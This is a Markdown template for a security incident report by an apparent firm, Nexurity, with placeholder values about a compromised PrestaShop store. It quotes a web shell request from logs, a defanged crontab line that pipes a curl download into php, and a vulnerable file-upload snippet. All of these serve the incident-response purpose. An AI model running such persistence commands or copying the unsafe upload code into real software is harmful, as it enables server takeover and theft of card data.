<!--
TEMPLATE · SECURITY INCIDENT REPORT · NEXURITY · v3.0 (Markdown)
-----------------------------------------------------------------
Variant of the audit template (same branding). Incident-specific sections:
timeline, indicators of compromise, GDPR.
Single Markdown file (GitHub-flavoured: tables, fenced code blocks). No images,
no external files, no raw HTML in the rendered content: these comments are the
only HTML, and they are invisible once rendered.
Rating: CVSS 4.0 (base score + vector).

BRANDING (generic template): what the issuer can customise is marked BRAND:
the issuer name under the title and the contact line at the end. Defaults = Nexurity.

FILLING RULES
1. Replace the fields in square brackets [ … ].
2. Duplicate one "### I-xx" block per finding (I- prefix) and one timeline row
   per event. Each timeline row has a phase:
   Reconnaissance · Intrusion · Persistence · Malicious action · Detection · Response.
3. Values marked [computed] are never typed by hand: render_report.py computes them
   from incident.json, so they always match.
   - Incident status: Compromise confirmed · Compromise suspected · Compromise not confirmed.
   - Dates are stored in ISO format (yyyy-mm-ddThh:mm) in incident.json and shown
     as dd/mm/yyyy hh:mm.
   - Exposure window: containment (or detection if not contained yet) − estimated start,
     shown as "x d y h".
   - Notification deadline: time of awareness + 72 hours (GDPR, Article 33).
   - Counts: number of findings per severity.
4. Any text taken from the logs, files or configuration MUST be escaped:
   - in prose and table cells: Markdown characters (\ ` * _ [ ] < > | #) are escaped
     and line breaks removed, so the text can never become a link, an image, a
     heading, a table column or raw HTML;
   - in code blocks: the fence is longer than any run of backticks in the content,
     so the content can never close the block;
   - malicious URLs and domains are defanged (hxxp, [.]) and secrets truncated.
5. Export: the file can be converted to PDF or Word with Pandoc, if installed.
-->

# Security incident report · [Website or application name]

<!-- BRAND · issuer name -->
**Nexurity** · Confidential · restricted distribution

[One sentence of context, e.g. Analysis of the compromise of [Client]'s PrestaShop 8.1 store, reported on 18 October 2026.]

| | |
|---|---|
| **Client** | [Company name] |
| **Reference** | INC-2026-[000] |
| **Period analysed** | [dd/mm] → [dd/mm/yyyy] |
| **Report version** | v1.0 · [dd month yyyy] |
| **Analyst** | [First Last] |

## Contents

1. [Executive summary](#01--executive-summary)
2. [Scope and evidence](#02--scope-and-evidence)
3. [Timeline](#03--timeline)
4. [Entry point](#04--entry-point)
5. [Indicators of compromise](#05--indicators-of-compromise)
6. [Detailed findings](#06--detailed-findings)
7. [Remediation](#07--remediation)
8. [Personal data](#08--personal-data)
9. [Appendices](#09--appendices)

---

## 01 · Executive summary

### What happened

**Incident status: [computed]** · Critical severity

| Estimated start | Detection | Containment | Exposure window |
|---|---|---|---|
| [dd/mm/yyyy hh:mm] | [dd/mm/yyyy hh:mm] | [dd/mm/yyyy hh:mm] | [computed] |

[Paragraph for management, in plain language: what happened, since when, what the attacker could do, whether data may have leaked and where things stand now. E.g.: The website was compromised on 2 October through an outdated module. The attacker planted a backdoor and used it to inject a fake payment form. The site has been secured since 18 October; a leak of card data cannot be ruled out.]

**What the attacker could do**

- [Run code on the server]
- [Modify the payment pages]
- [Read the database]

**Not observed**

- [Root access to the server]
- [Pivoting to other hosted sites]

### Three immediate actions

1. **Critical** · [Change every password: back office, database, FTP/SSH, API keys.]
2. **Critical** · [Remove the backdoors listed in section 05 and update the vulnerable module.]
3. **High** · [Decide on notifying the data protection authority before [computed notification deadline].]

---

## 02 · Scope and evidence

### What we analysed

**Reported symptoms**

- [Redirects to a third-party site from the payment page]
- [Hosting provider alert: mass e-mail sending]

**Affected system**

- [https://www.example.com · PrestaShop 8.1.7]
- [Server: Debian 12 · Nginx 1.24 · PHP 8.2 · MariaDB 10.11]
- [Access provided: SSH, user with sudo]

### Evidence sources

Every source was copied before analysis; its SHA-256 fingerprint proves it has not been altered since.

| Source | Location | Period covered | SHA-256 fingerprint |
|---|---|---|---|
| [Web access logs] | `[/var/log/nginx/access.log*]` | [01/09 → 18/10/2026] | `[3f9a…c21e]` |
| [Authentication logs] | `[/var/log/auth.log*]` | [20/09 → 18/10/2026] | `[a07b…19fd]` |
| [PHP errors] | `[/var/log/php8.2-fpm.log]` | […] | […] |
| [Website file tree] | `[/var/www/example]` | [snapshot of 18/10] | […] |
| [Database] | [Export of employee, module and configuration tables] | [18/10/2026] | […] |

### Approach

1. **Preservation**: evidence copied and fingerprinted.
2. **Log triage**: tool-assisted extraction of suspicious events.
3. **Analysis**: files, accounts, scheduled tasks, database.
4. **Validation**: every conclusion independently re-checked.
5. **Reporting**: report, remediation plan, GDPR section.

Read-only analysis: nothing on the system was modified or restarted. Log contents are treated as untrusted data. Limitations: [logs older than 01/09 unavailable (rotation); no access to the hosting provider's logs].

---

## 03 · Timeline

### How the attack unfolded

<!-- One row per event, in chronological order. Phase: Reconnaissance · Intrusion · Persistence · Malicious action · Detection · Response -->
| Date and time | Phase | Event | Details | Source |
|---|---|---|---|---|
| [29/09/2026 22:51] | Reconnaissance | [Automated scan of the website] | [1,240 requests in 6 minutes from 203.0.113.42 to module paths known to be vulnerable.] | access.log · l. [48,211–49,450] |
| [02/10/2026 03:14] | Intrusion | [Exploitation of module X] | [A PHP file was uploaded through the module's unprotected upload form.] | access.log · l. [61,027] |
| [02/10/2026 03:15] | Persistence | [Backdoor planted] | [`img/cms/.cache.php` created, then a scheduled task added that recreates it every hour.] | file timestamp · www-data crontab |
| [05/10/2026 11:02] | Malicious action | [Script injected into the payment page] | [Checkout template modified to load an external script that copies the card fields.] | ps_configuration · access.log |
| [18/10/2026 09:40] | Detection | [Reported by a customer] | [Unusual redirect noticed during a payment.] | [customer e-mail] |
| [18/10/2026 14:05] | Response | [Website put in maintenance mode] | [Site placed in maintenance, FTP access disabled.] | [client action] |

Times shown in [Paris time (UTC+2)]. Server logs are in UTC and have been converted.

---

## 04 · Entry point

### How the attacker got in

| | |
|---|---|
| **Vector** | [Unrestricted file upload] |
| **Component** | `[modules/x/upload.php]` |
| **Confidence** | [Established · Likely · Hypothesis] |
| **Related finding** | [I-01](#i-01--unrestricted-php-file-upload-in-module-x) |

[Three to five sentences: the flaw, why it was exploitable, and the evidence linking it to the start of the attack.]

```text
# access.log · l. [61,027] (IP addresses and sensitive values masked where needed)
203.0.113.42 - - [02/Oct/2026:01:14:07 +0000] "POST /modules/x/upload.php HTTP/1.1" 200 41 "-" "Mozilla/5.0"
203.0.113.42 - - [02/Oct/2026:01:14:09 +0000] "GET /img/cms/.cache.php?c=id HTTP/1.1" 200 54 "-" "Mozilla/5.0"
```

**Ruled-out hypotheses**

- [Stolen back-office password: no unusual admin login during the period.]
- [SSH access: no successful login from an unknown address.]

---

## 05 · Indicators of compromise

### Traces to look for and remove

Use these to check that nothing is left behind, here or on other sites on the same hosting. Any secrets found are truncated.

| Type | Value | Role | First seen | Action |
|---|---|---|---|---|
| IP address | `[203.0.113.42]` | [Exploitation and backdoor control] | [29/09 22:51] | [Block] |
| File | `[img/cms/.cache.php]` | [Backdoor (web shell)] | [02/10 03:15] | [Remove] |
| Scheduled task | `[0 * * * * curl -s hxxp://… \| php]` | [Recreates the backdoor] | [02/10 03:16] | [Remove] |
| Account | `[support@…]` (PrestaShop employee) | [Admin account created by the attacker] | [03/10 00:40] | [Remove] |
| Domain | `[cdn-payment[.]example]` | [Card data collection] | [05/10 11:02] | [Block] |
| Hash | `[SHA-256 9c1d…77ab]` | [Backdoor fingerprint] | — | — |

Malicious URLs and domains are defanged (`hxxp`, `[.]`) to prevent accidental clicks.

---

## 06 · Detailed findings

### The flaws that made the attack possible

| Critical | High | Medium | Low | Informational |
|:---:|:---:|:---:|:---:|:---:|
| [computed] | [computed] | [computed] | [computed] | [computed] |

<!-- ▼ FINDING · template to duplicate (same structure as the audit report, I- prefix) -->
### I-01 · [Unrestricted PHP file upload in module X]

**Critical** · CVSS 4.0: **9.3** · Role in the incident: **Entry point**

| | |
|---|---|
| **Category** | CWE-434 · Unrestricted upload |
| **Component** | `[modules/x/upload.php]` |
| **CVSS 4.0 vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |

**Description**

[The module accepts any file type and stores it in a folder where PHP is executed.]

**Evidence**

```php
// [modules/x/upload.php:42]
move_uploaded_file($_FILES['f']['tmp_name'], _PS_IMG_DIR_.'cms/'.$_FILES['f']['name']);
```

**Recommendation**

- [Update the module to the fixed version or uninstall it.]
- [Block PHP execution in upload folders.]
<!-- ▲ end of template -->

### I-02 · [PHP execution allowed in image folders]

**High** · CVSS 4.0: **7.1** · Role in the incident: **Aggravating factor**

| | |
|---|---|
| **Category** | A05 · Security misconfiguration |
| **Component** | [Nginx] |

**Description**

[Description.]

**Recommendation**

```nginx
# Nginx
location ~* ^/(img|upload|download)/.*\.php$ { deny all; }
```

### I-03 · [Log retention too short to trace the first access]

**Medium** · CVSS 4.0: **[4.0]** · Role in the incident: **[Hindered the analysis]**

**Observation**

[Observation.]

**Recommendation**

[Keep logs for at least 6 months, on storage separate from the web server.]

---

## 07 · Remediation

### What to do, in order

**Containment · immediate · Cut off the attacker**

- — · [Change every password and revoke API keys]
- — · [Block the IPs and domains in section 05]
- — · [Delete the illegitimate admin account]

**Eradication · 24 to 72 h · Clean up and fix**

- — · [Remove the backdoors and the scheduled task]
- **I-01** · [Fix or remove the vulnerable module]
- — · [Compare the PrestaShop core with the official release]
- — · [Or restore a backup from before 02/10, then apply the fixes]

**Hardening · 30 days · Prevent a repeat**

- **I-02** · [Block PHP in upload folders]
- **I-03** · [Extend log retention]
- — · [Set up file integrity monitoring]
- — · [Schedule a full security audit]

These actions are recommendations. Unless stated otherwise, none of them was carried out as part of this analysis.

---

## 08 · Personal data

### GDPR obligations

| | |
|---|---|
| **Personal data exposed** | [Yes · No · Cannot be ruled out] |
| **People affected (estimate)** | [≈ 1,800 customers] |
| **Became aware** | [18/10/2026 09:40] |
| **Notification deadline** | [computed] |

| Data category | Exposure | Rationale |
|---|---|---|
| [Payment card data] | [Likely] | [Collection script active on the payment page from 05/10 to 18/10.] |
| [Customer identity and contact details] | [Possible] | [Database reachable through the backdoor; no extraction seen in the logs.] |
| [Customer passwords] | [Possible] | [Stored as bcrypt hashes.] |

**What the GDPR requires**

- **Article 33**: a personal data breach that poses a risk to individuals must be notified to the supervisory authority (in France, the CNIL) within 72 hours of becoming aware of it.
- **Article 34**: if the risk is high (card data, for example), the people affected must also be informed.
- Every breach, even when not notified, must be recorded in the breach register.

The decision to notify lies with the data controller, [Client company name]. This report provides the technical facts needed for that decision and is not legal advice. CNIL online notification: notifications.cnil.fr.

---

## 09 · Appendices

### Glossary

- **Backdoor**: hidden file or access left by an attacker to get back into the system.
- **Indicator of compromise**: technical trace (IP address, file, account) that signals an intrusion.
- **SHA-256 fingerprint**: unique signature of a file: the slightest change alters it completely.
- **CVSS**: 0–10 score that measures the severity of a vulnerability. This report uses version 4.0, published by FIRST.

### Document history

| Version | Date | Purpose |
|---|---|---|
| 1.0 | [dd/mm/yyyy] | Initial report |
| 1.1 | [dd/mm/yyyy] | [Check after remediation] |

This report reflects what was known when it was written, based on the evidence listed in section 02. It is strictly confidential and intended solely for the client named at the top. The analysis was carried out with the client's authorisation, read-only, without altering production data.

---

<!-- BRAND · issuer name and contact details -->
Nexurity · [Address] · [Contact email] · [Phone] · [Website]
Ref. INC-2026-[000] · Confidential
